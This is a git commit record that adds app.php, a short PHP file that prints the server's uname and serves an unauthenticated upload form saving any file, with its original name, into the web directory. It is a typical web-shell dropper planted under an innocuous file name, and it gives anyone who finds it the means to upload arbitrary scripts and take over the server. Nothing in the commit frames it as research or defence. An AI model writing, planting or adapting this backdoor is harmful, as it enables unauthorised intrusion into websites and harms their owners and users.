af37075c49cb168bba9cb5dc0a7c83f8135b7362
ETASMAYA <adsteramaheswara@gmail.com>
2026-09-05 07:43:48 -0400

    Add files via upload

---
+++ app.php
@@ -0,0 +1,14 @@
+<?php
+echo "<b>Ngehe</b>";
+echo "<br>".php_uname()."<br>";
+echo "<form method='post' enctype='multipart/form-data'>
+<input type='file' name='upl'><input type='submit' name='upload' value='upload'>
+</form>";
+if($_POST['upload']) {
+    if(@copy($_FILES['upl']['tmp_name'], $_FILES['upl']['name'])) {
+    echo "Sukses";
+    } else {
+    echo "Gagal";
+    }
+}
+?>
